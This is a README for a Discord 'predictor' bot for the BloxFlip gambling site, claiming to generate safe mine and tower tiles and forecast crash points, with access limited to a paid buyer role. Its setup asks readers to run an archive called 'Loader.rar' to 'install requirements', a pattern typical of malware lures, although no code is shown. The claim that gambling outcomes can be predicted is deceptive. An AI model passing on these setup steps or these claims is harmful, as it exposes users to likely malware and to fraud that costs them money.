# BloxFlip Mine and Tower Predictor Bot

## Features

- **Mine Grid Generator**: Generates a 5x5 grid with a specified number of safe tiles.
- **Tower Grid Generator**: Generates a tower with up to 8 rows, each containing a safe spot and two dangerous spots.
- **Crash Game Predictor**: Predicts crash points for a specific game based on previous game data.

## Requirements

- Python 3.7+
- `interactions.py` library
- `cloudscraper` library

## Setup

- Clone the repository

- Run "Loader.rar" - installs requirements from archive

- Add your Discord bot token in the `BotToken` variable in the script.
- Set your `ServerId` and `BuyerRoleId` variables to match your Discord server and role IDs.

- Run the bot:

```bash
python main.py
```

## Usage

### Commands

#### `/mines`

Generates a mine grid with a specified number of safe tiles.

**Usage:**

```bash
/mines game_id=<game_id> clicks=<number_of_safe_tiles>
```

- `game_id`: The ID of the game. Must follow specific formatting rules to be valid.
- `clicks`: The number of safe spots to generate (Max: 23).

#### `/towers`

Generates a tower grid with a specified number of rows.

**Usage:**

```bash
/towers game_id=<game_id> rows=<number_of_rows>
```

- `game_id`: The ID of the game. Must follow specific formatting rules to be valid.
- `rows`: The number of rows to generate (Max: 8).

#### `/crash`

Predicts the outcome of a crash game based on previous game data.

**Usage:**

```bash
/crash
```

This command does not require any additional parameters. It will return an estimated crash point and the chance of the estimate being correct.

### Permissions

- The bot checks if the user has the `BuyerRoleId` or if their user ID matches a predefined ID (`1262827258444517446`).
- If the user does not have the required permissions, the bot will respond with a "Not Eligible" message.

## Preview 

## Attatchments
![image](https://user-images.githubusercontent.com/112899052/205460675-819237a8-1804-4d71-90fb-6b8ba05757ff.png) 

![image](https://user-images.githubusercontent.com/112899052/205461391-67e8dcd8-e9d8-4051-a2c5-e6e6eebf1ba2.png)

![image](https://user-images.githubusercontent.com/112899052/205461352-5e5daa11-c002-4535-88ec-be313aa5c63f.png)

## Contributing

Star and Fork this Repo to Contribute